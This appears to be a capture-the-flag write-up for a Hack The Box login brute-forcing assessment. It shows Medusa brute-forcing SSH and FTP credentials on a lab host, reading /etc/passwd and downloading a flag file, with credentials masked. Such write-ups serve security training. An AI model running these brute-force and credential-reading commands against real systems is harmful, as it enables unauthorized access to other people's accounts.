
# Brief

This is the second part of the skills assessment.
`YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. 

Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

> Target: 94.237.50.221:46241

# Questions

1. What is the username of the ftp user you find via brute-forcing?

```sh
# What does this mean? Given the username received in Part I, it is safe to assume that we must brute force SSH. Let's try that
medusa -h 94.237.50.221 -n 46241 -u ****** -P passwords.txt -M ssh -t 3

bash: medusa: command not found


# Install Medusa
sudo apt update -y && sudo apt install medusa -y


# try again
medusa -h 94.237.50.221 -n 46241 -u ****** -P passwords.txt -M ssh -t 3

...
ACCOUNT FOUND: [ssh] Host: 94.237.50.221 User: ****** Password: ****** [SUCCESS]
...

# Verify
ssh ******@94.237.50.221 -p 46241 # ******


# We are in. Situational awareness
ls
IncidentReport.txt  passwords.txt  username-anarchy

******@ng-487515-loginbfsatwo-jx8vk-bc5598c69-qrhs7:~$ ls /home
******

# Ok. Anything from passwd file?
tail /etc/passwd

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
ftp:x:105:107:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
******:x:1000:1000::/home/******:/bin/bash
thomas:x:1001:1001::/var/.hidden:/bin/bash


# Doesn't look like much. But we tried Thomas as answer and it worked. Read the IncidentReport anyways to confirm
cat IncidentReport.txt

System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.

# Confirmation.
```


<br>
2. What is the flag contained within flag.txt?
<br>
<br>


```sh
# Since we have all the components inside the machine, inside that machine, let's reproduce the steps from Web Services. 

# 1. Map the machine
nmap localhost

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh


# 2. Run Medusa
medusa -h 127.0.0.1 -u thomas -P passwords.txt -M ftp -t 5

...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: ******! [SUCCESS]
...

# Connect to ftp from inside the target we ssh-ed into
ftp ftp://thomas:******!@localhost

-bash: !@localhost: event not found


# Escape
ftp ftp://thomas:'******!'@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.

ftp> ls
229 Entering Extended Passive Mode (|||7956|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           28 Sep 10  2024 flag.txt
226 Directory send OK.

ftp> binary
200 Switching to Binary mode.

ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||65111|)
150 Opening BINARY mode data connection for flag.txt (28 bytes).
100% |*****************************************************************************************|    28      546.87 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (79.71 KiB/s)

ftp> exit
221 Goodbye.

ls
IncidentReport.txt  flag.txt  passwords.txt  username-anarchy

cat flag.txt 
HTB{******}

```
